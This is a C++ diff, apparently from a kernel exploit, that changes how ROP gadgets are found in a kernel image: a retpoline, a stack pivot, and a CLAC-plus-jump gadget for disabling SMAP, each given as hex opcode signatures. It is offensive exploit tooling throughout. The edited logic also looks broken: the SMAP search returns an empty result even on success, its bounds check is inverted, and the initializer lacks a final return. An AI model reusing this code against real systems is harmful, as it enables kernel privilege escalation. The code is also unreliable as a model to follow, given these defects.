@@ -249,6 +249,9 @@ private:
 		constexpr Byte ClacJmpRel32[] = { 0x0F, 0x01, 0xCA, 0xE9 };
 		auto signature = Sig::FromBytes(std::span<const Byte>(ClacJmpRel32));
 		
+		const std::string restOfGadgetOpcodes = "4881c4b8000000415f415e415d415c5f5e5b5dc3";
+		auto restOfGadget = Sig::FromHex(restOfGadgetOpcodes);
+
 		const Byte* smapGadget = nullptr;
 		g_KernelBinary->ForEveryCodeSignatureOccurrence(signature,
 			[&](const Byte* occurrence) -> bool {
@@ -256,12 +259,24 @@ private:
 				auto* jmpTarget = occurrence + *(int*)rel32 + 5;
 
 				// simple bounds check
-				//if (jmpTarget > g_KernelBinary->)
+				if (g_KernelBinary->InKernelBounds(jmpTarget)) return true;
 
 				auto found = Sig::FindSignatureInBuffer(
-					std::span<
-				)
+					std::span<const Byte>(jmpTarget, jmpTarget + restOfGadget.size()),
+					restOfGadget
+				);
+
+				if (found) {
+					smapGadget = occurrence;
+					return false;
+				}
+
+				// continue searching
+				return true;
 			});
+
+		if (smapGadget) g_KernelBinary->MappedToKernel(smapGadget);
+		return std::nullopt;
 	}
 
 	static bool InitializeGadgets()
@@ -272,18 +287,15 @@ private:
 		if (!retpolineAddress) return false;
 		s_Gadgets.Retpoline = retpolineAddress.value();
 
-		auto disableSmapSignature = Sig::FromHex(
-			"488b442420488b4c2428488b5424304c8b4424384c8b4c24404883c44848ffe0"
-		);
-		auto disableSmapAddress = g_KernelBinary->FindSignature(disableSmapSignature, KernelBinary::LocationFlags::InCode);
-		if (!disableSmapAddress) return false;
-		s_Gadgets.DisableSmap = disableSmapAddress.value();
-
 		const std::string StackPivotCode = "488be54883c4305f5e5dc3";
 		auto stackPivotSignature = Sig::FromHex(StackPivotCode);
 		auto stackPivotAddress = g_KernelBinary->FindSignature(stackPivotSignature, KernelBinary::LocationFlags::InCode);
 		if (!stackPivotAddress) return false;
 		s_Gadgets.StackPivot = stackPivotAddress.value();
+	
+		auto smapGadget = TryFindSmapGadget();
+		if (!smapGadget) return false;
+		s_Gadgets.DisableSmap = smapGadget.value();
 	}
 
 
